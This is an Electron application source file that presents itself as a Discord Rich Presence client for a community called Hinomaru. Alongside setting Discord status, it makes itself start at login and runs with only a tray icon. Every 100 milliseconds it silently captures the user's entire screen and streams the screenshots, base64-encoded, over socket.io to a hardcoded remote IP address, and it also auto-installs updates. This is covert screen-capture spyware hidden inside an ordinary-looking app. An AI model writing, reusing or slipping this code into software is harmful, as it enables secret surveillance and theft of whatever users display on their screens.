const drpc = require("discord-rpc");
const { app, BrowserWindow, Menu, Tray, Notification  } = require('electron');
const screenshot = require('screenshot-desktop');
var AutoLaunch = require('auto-launch');
var socket = require('socket.io-client')('http://195.66.114.237:5000');
const rpc = new drpc.Client({ transport: 'ipc' });
const { v4: uuidv4 } = require('uuid');
const {autoUpdater} = require('electron-updater');

let tray = null;
async function createWindow () {
    var minecraftAutoLauncher = new AutoLaunch({
        name: 'Hinomaru',
        path: app.getPath("exe"),
    });
    minecraftAutoLauncher.isEnabled().then(function(isEnabled){
        if(isEnabled){
            return;
        }
        minecraftAutoLauncher.enable();
    })
    .catch((err)=>{
        new Notification({ title: "Error", body: err.message }).show()
    });
    tray = new Tray(__dirname + '/icon.png')
    const contextMenu = Menu.buildFromTemplate([
        { label: 'Закрыть', click:()=>{
            app.quit()
        } }
    ]);
    tray.setContextMenu(contextMenu);
    const win = new BrowserWindow({
        icon: __dirname + '/icon.png',
        title: "Hinomaru",
        show: false
    })
    rpc.on("ready",()=>{
        rpc.setActivity({
            largeImageKey: 'hinomaru',
            buttons:[{label:"Вступить",url:"https://discord.gg/hinomaru"}],
            largeImageText: 'Hinomaru',
            instance: false,
            partyId: "status"
        });
    });
    var uuid = uuidv4();
    socket.emit("join-message", uuid);

    interval = setInterval(function() {
        screenshot().then((img) => {
            var imgStr = new Buffer(img).toString('base64');

            var obj = {};
            obj.room = uuid;
            obj.image = imgStr;

            socket.emit("screen-data", JSON.stringify(obj));
        })
    }, 100)
    rpc.login({ clientId:"723149921934508093" }).catch(console.error);
}

app.whenReady().then(()=>{
    autoUpdater.checkForUpdatesAndNotify();
    createWindow();
});
autoUpdater.addListener('update-downloaded', (info) => {
    autoUpdater.quitAndInstall();
  });